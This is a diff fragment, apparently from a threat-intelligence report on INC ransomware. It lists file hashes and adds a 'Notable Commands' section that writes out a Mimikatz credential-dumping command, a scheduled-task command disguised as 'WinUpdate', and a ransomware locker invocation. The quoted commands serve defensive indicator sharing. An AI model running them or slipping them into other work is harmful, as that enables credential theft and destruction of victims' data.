@@ -61,6 +61,17 @@ SHA-256:
 - ef394149c8da3af730c37d550027df8639a3aaa6feaccea60112461ae6955829  Windows INC encryptor
 - 753207ad5e72ddc6b13889132e5de18836b1a2acf954443655fea82b430e4c99  ESXi INC encryptor
 - 0206a670243efa0f736e3725c4c7c8879b262cb07af47a8dcfa18bc9787cc1bd  Multi-platform payload archive
+
+Notable Commands:
+
+# Credential Theft
+
+C:\Users\Public\mimi.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" 
+
+# Ransomware deployment via scheduled tasks; runs locker.exe
+
+schtasks /create /tn "WinUpdate" /tr "C:\Windows\Temp\go.bat" /sc once /st 00:00 /ru <account> /rp <password> /rl highest /f 
+- C:\Windows\Temp\locker.exe --mode fast --dir <drive>:\
 ```
 
 ---
